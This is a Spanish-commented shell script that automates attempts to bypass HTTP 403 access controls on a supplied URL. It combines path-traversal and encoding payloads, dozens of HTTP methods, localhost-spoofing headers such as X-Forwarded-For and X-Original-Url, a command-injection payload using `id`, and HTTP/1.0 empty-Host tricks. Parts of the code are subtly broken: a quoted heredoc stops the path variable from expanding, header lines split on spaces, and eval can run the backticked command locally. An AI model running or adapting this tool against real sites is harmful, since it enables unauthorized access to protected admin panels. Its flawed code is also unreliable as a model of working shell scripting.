#!/bin/sh
# 403bypass5.sh - versión ultra-compatible (Bash 1.0.x / Bourne shell)
# Solo muestra 200 OK + petición curl completa (-v)
# User-Agent fijo: Chrome/Edge 120 style

if [ $# -ne 1 ]; then
    echo "Uso: $0 <URL_COMPLETA>"
    echo "Ejemplos:"
    echo "  $0 https://target.com/admin/"
    echo "  $0 https://ejemplo.com/panel"
    exit 1
fi

TARGET="$1"

# Quitamos / final si existe (compatible con shells antiguos)
case "$TARGET" in
    */) TARGET=`echo "$TARGET" | sed 's/\/$//'` ;;
esac

echo ""
echo "============================================================="
echo " Pruebas de bypass 403 → $TARGET/"
echo " (solo se muestran respuestas 200 OK)"
echo " User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
echo "============================================================="
echo ""

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"

# ────────────────────────────────────────────────
# Payloads de path (usamos here-document simple)
# ────────────────────────────────────────────────
payloads() {
cat << 'EOF'
/*
//
/.
/../${LAST_DIR}/
/%2e/
/%2e%2e/${LAST_DIR}/
/.;/
/..;/
/%20/
/%09/
/?
/%3f
/%23
/*
/.random
/index.aspx
/index.asp
/default.aspx
/upload.htm
/upload.html
/robots.txt
/favicon.ico
/sitemap.xml
/upload.shtml
/upload.xhtml
/upload.wml
/upload.perl
/upload.pl
/upload.plx
/upload.ppl
/upload.cgi
/upload.jsp
/upload.js
/upload.jp
/upload.php
/upload.php5
/upload.php4
/upload.php3
/upload.php2
/upload.phtml
/upload.asp
/upload.sh
/default.htm
/default.html
/home.htm
/home.html
/Default.html
/Default.htm
/upload.html.var
/upload.go
/login.htm
/login.html
/index.htm
/index.html
/index.php
/index.jsp
/index.php
/index.do
/index2.htm
/index2.html
/index.shtml
/index.xhtml
/index.wml
/index.perl
/index.pl
/index.plx
/index.ppl
/index.cgi
/index.js
/index.jp
/index.php?run=%26echo%20`id`%24()%5C%20
/index.php5
/index.php4
/index.php3
/index.php2
/index.phtml
/index.sh
EOF
}

# Último segmento del path (basename manual ultra-compatible)
LAST_DIR=`echo "$TARGET" | sed 's|.*/||'`

# Métodos a probar
METHODS="GET POST PUT DELETE TRACE PACTH TRACK OPTIONS CONNECT PATCH ACL ARBITRARY PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK"

special_headers() {
cat << 'EOF'
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: 127.0.0.1:80
X-Forwarded-For: ::1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Client-IP: 127.0.0.1
X-Forwarded-Host: localhost
Forwarded: for=127.0.0.1;proto=https;by=localhost
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
EOF
}

# Función auxiliar para ejecutar y filtrar solo 200
run_curl() {
    cmd="$1"
    echo "$cmd"
    echo "--------------------------------------------------"

    # Ejecutamos con -v para ver la petición completa
    # -s silencia progreso, -k ignora cert, -m 8 timeout 8s
    output=`eval "$cmd -s -k -m 8 -v -o /dev/null -w '%{http_code}'" 2>&1`

    # Última línea = código HTTP
    http_code=`echo "$output" | tail -n 1`

    if [ "$http_code" = "200" ]; then
        # Mostramos cabeceras + petición (quitamos líneas de curl debug innecesarias)
        echo "$output" | grep -v "^\{" | grep -v "^\}" | grep -v "^\* " | grep -v "^  "
        echo ""
        echo
        echo "--------------------------------------------------"
        echo ""
    fi
}

# ────────────────────────────────────────────────
# 1. Variaciones de PATH + métodos
# ────────────────────────────────────────────────
echo "[*] 1. Variaciones de PATH + cambio de método"
echo "-------------------------------------------------------------"

for payload in `payloads`; do
    test_url="${TARGET}${payload}"

    for method in $METHODS; do
        cmd="curl -k -X $method -I -A \"$UA\" \"$test_url\""
        run_curl "$cmd"
    done
done

# ────────────────────────────────────────────────
# 2. Cabeceras de spoofing (solo GET por simplicidad)
# ────────────────────────────────────────────────
echo ""
echo "[*] 2. Cabeceras de proxy / localhost spoofing (GET)"
echo "-------------------------------------------------------------"

for header in `special_headers`; do
    for extra in "" "/" "//" "/." "/..;/" "/.;/" "/ "; do
        test_url="${TARGET}${extra}"
        cmd="curl -k -X GET -I -A \"$UA\" -H \"$header\" \"$test_url\""
        run_curl "$cmd"
    done
done

# ────────────────────────────────────────────────
# 3. Trucos HTTP/1.0 + Host vacío
# ────────────────────────────────────────────────
echo ""
echo "[*] 3. Trucos HTTP/1.0 + Host header vacío"
echo "-------------------------------------------------------------"

test_url="${TARGET}/"

# Normal (HTTP/1.1 por defecto)
cmd="curl -k -I -A \"$UA\" \"$test_url\""
run_curl "$cmd"

# Forzamos HTTP/1.0
cmd="curl -k --http1.0 -I -A \"$UA\" \"$test_url\""
run_curl "$cmd"

# HTTP/1.0 + Host: vacío
cmd="curl -k --http1.0 -I -A \"$UA\" -H \"Host:\" \"$test_url\""
run_curl "$cmd"

